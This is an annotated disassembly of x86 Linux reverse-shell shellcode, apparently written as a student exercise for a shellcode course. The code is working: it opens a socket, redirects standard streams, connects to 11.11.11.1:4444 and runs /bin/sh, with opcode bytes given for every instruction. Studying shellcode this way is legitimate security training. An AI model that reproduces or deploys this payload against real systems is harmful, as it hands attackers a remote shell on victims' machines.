 ; Student ID: SLAE – 871
 ; This is just small part of analysis. Please take a look on the blog to get full explanation

    00000000  31DB              xor ebx,ebx        ; ebx = zero

    ; socket(int domain, int type, int protocol);

    00000002  F7E3              mul ebx        ; eax and edx = zero ==> mul EAX by EDX
    00000004  53                push ebx        ; push zero on the stack  
    00000005  43                inc ebx        ; ebx = 1
    00000006  53                push ebx        ; 1 is for SOCK_STREAM
    00000007  6A02              push byte +0x2    ; 2 is for AF_INET
    00000009  89E1              mov ecx,esp        ; pointer
    0000000B  B066              mov al,0x66        ; socketcall
    0000000D  CD80              int 0x80        ; Go baby go!

    ; dup2(int oldfd, int newfd)

    0000000F  93                xchg eax,ebx    ; I’ve used triple XOR!! in my shellcode! OK,OK ! I’ll not                                                                                   ; optimize my shell. Basically it’s a bit like chess  rochade.
    00000010  59                pop ecx        ; pop 2 in ECX
    00000011  B03F              mov al,0x3f        ; dup2 ==> according to my bindshell assignment: ystemcall                                                                             ; value for dup2 (which needs to be stored in EAX): 63 =  0x3f hex
    00000013  CD80              int 0x80        ; Go! (run syscall)

    00000015  49                dec ecx        ; decrement ECX (from 2 to 1)
    00000016  79F9              jns 0x11        ; jump and do same as before – in this case (with ECX from 2 to 0)
    00000018  680B0B0B01        push dword 0x10b0b0b    ; push IP 11.11.11.1
    0000001D  680200115C        push dword 0x5c110002    ; push port 0x5c11 (little endian) = 4444
    00000022  89E1              mov ecx,esp            ; pointer
    00000024  B066              mov al,0x66            ; socketcall to al

    ; connect()

    00000026  50                push eax
    00000027  51                push ecx        ; pointer to sockaddr
    00000028  53                push ebx        ; sockfd
    00000029  B303              mov bl,0x3        ; sys_connect     number
    0000002B  89E1              mov ecx,esp        ; pointer
    0000002D  CD80              int 0x80        ; syscall

    0000002F  52                push edx            ; EDX pushed ==> edx = 0
    00000030  686E2F7368        push dword 0x68732f6e    ; /bin/sh (here hs/n)
    00000035  682F2F6269        push dword 0x69622f2f    
    0000003A  89E3              mov ebx,esp            ; pointer – /shell address in ebx
    0000003C  52                push edx            ; push 0
    0000003D  53                push ebx            ; push pointer /bin/sh
    0000003E  89E1              mov ecx,esp            ; /shell (bin/sh)pointer to ECX
    00000040  B00B              mov al,0xb            ; execve into al
    00000042  CD80              int 0x80            ; syscall

